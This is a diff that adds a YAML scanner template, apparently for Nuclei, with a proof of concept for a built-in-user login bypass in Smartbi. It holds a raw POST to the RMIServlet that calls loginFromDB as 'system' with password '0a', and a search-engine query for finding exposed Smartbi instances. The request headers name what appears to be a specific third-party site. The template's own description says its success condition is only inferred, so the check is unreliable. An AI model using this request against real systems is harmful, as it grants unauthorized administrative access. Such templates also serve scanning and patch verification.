@@ -1,0 +1,54 @@
+id: poc-a50514be03fd6c3879b9
+info:
+  name: Smartbi内置用户登陆绕过漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a50514be03fd6c3879b9a75eb7cf44b5
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: a50514be03fd6c3879b9a75eb7cf44b5
+    fofa: + hunter：`app.name=="SMARTBI 思迈特"`
+http:
+- raw:
+  - 'POST /smartbi/vision/RMIServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: identity
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: JSESSIONID=B08E6669BFA8E9D85FB6BD98411C349C
+
+    Origin: https://smartbi.cy-sys.cn
+
+    Referer: https://smartbi.cy-sys.cn/smartbi/vision/RMIServlet
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-User: ?1
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+
+    Content-Length: 81
+
+
+    className=UserService&methodName=loginFromDB&params=["system","0a"]'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
